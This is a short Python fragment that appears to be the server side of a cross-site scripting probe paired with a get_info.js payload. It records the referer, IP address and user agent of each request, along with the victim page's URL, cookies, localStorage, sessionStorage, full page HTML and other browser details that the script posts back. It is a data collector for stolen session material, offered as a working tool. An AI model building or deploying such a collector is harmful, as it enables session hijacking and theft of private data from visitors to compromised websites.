#! /usr/bin/env python
# encoding=utf-8
#   quininer - 140502
#	get_info - base probe
#		and get_info.js
#
'''
with open('./static/serv/get_info.py') as files: exec files.read()
'''
serverinfo['referer'] = b64ens(request.headers.get('Referer'))
serverinfo['ctime'] = b64ens(ctime())
serverinfo['remote_addr'] = b64ens(request.environ.get('REMOTE_ADDR'))
serverinfo['x_forwarded_for'] = b64ens(request.headers.get('X-Forwarded-For'))
serverinfo['user_agent'] = b64ens(request.headers.get('User-Agent'))
serverinfo['accept_language'] = b64ens(request.headers.get('Accept-Language'))
serverinfo['x_requested_with'] = b64ens(request.headers.get('X-Requested-With'))

browserinfo['URL'] = b64ens(request.forms.url)
browserinfo['cookie'] = b64ens(request.forms.cookie)
browserinfo['localStorage'] = b64ens(request.forms.localStorage)
browserinfo['sessionStorage'] = b64ens(request.forms.sessionStorage)
browserinfo['browser'] = b64ens(request.forms.browser)
browserinfo['user_agent'] = b64ens(request.forms.user_agent)
browserinfo['screen'] = b64ens(request.forms.screen)
browserinfo['istouch'] = b64ens(request.forms.istouch)
browserinfo['referrer'] = b64ens(request.forms.referrer)
browserinfo['os'] = b64ens(request.forms.os)
browserinfo['date'] = b64ens(request.forms.date)
browserinfo['plugins'] = b64ens(request.forms.plugins)
browserinfo['websocket'] = b64ens(request.forms.websocket)
browserinfo['java'] = b64ens(request.forms.java)
browserinfo['page_html'] = b64ens(request.forms.page_html)
